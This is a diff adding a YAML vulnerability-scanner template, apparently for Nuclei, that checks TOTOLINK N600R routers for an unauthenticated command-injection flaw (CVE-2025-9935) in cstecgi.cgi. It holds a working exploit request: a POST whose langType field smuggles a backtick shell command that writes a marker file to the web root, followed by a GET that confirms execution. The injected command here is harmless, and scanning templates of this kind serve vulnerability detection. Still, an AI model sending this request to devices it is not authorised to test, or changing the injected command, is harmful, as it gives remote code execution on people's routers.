@@ -1,0 +1,42 @@
+id: totolink-n600r-rce
+
+info:
+  name: "TOTOLINK N600R cstecgi.cgi 命令注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    该漏洞源于 /web_cste/cgi-bin/cstecgi.cgi 二进制模块中的 sub_4159F8 函数逻辑缺陷。该函数在处理前端传入参数时，未对用户输入实施有效的验证与转义机制，直接将其拼接至 system() 函数调用参数中，形成可被利用的命令注入入口。攻击者可通过构造恶意输入触发未经验证的系统命令执行，无需身份认证即可实现远程代码执行。
+  reference:
+  - CVE-2025-9935
+  tags: TOTOLINK
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /cgi-bin/cstecgi.cgi HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    X-Requested-With: XMLHttpRequest
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+    {
+    "topicurl":"setting/setLanguageCfg",
+    "langType":"`echo 'NdayTest' > ../NTest.txt`"
+    }
+- raw:
+  - |
+    GET /NTest.txt HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
